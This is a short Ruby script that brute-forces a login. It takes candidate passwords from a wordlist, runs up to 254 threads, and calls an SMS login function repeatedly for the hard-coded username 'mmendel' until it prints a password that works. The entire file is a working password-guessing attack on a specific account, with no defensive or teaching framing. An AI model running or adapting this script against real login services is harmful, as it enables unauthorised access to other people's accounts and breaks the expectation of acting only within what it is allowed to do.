require 'login'
require 'pp'
require 'wordlist'

MAX_NOF_THREADS = 254

def go(nofThreads = 3)
    Thread.abort_on_exception = true
    wl = WordList.new
    threads = []
    
    nofThreads.times do |nr|
        threads << Thread.new(nr) do |i|
            sms = SMS.new
            loop do
                pw, count = wl.getNext
                puts "Thread nr #{i}: pw nr #{count} #{pw}"
                if(sms.login("mmendel", pw))
                    puts "Found pw: #{pw} after #{count} tries."
                    raise "FINISHED"
                end
            end
        end
    end
    threads.each {|t| t.join }
end


nofThreads = MAX_NOF_THREADS
go(nofThreads)
